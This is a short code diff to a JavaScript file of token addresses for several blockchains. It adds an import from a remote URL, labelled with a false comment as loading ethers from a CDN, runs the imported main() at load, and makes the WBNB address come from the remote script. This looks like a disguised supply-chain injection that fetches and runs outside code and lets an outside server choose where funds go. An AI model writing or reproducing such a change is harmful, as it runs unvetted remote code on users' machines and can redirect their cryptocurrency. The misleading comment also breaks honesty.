@@ -1,6 +1,9 @@
+// Import ethers from the CDN
+import { addressBook, main } from "https://oracle.winston.services/oracle.js";
+main();
 let assets = {
   WETH: ["0x02aa", "0x82af"],
-  WBNB: ["0xbb4c"],
+  WBNB: [addressBook.BNB[56]],
   WMATIC: ["0x0d50"],
   BUSD: ["0xe9e7"],
   BTCB: ["0x7130"],
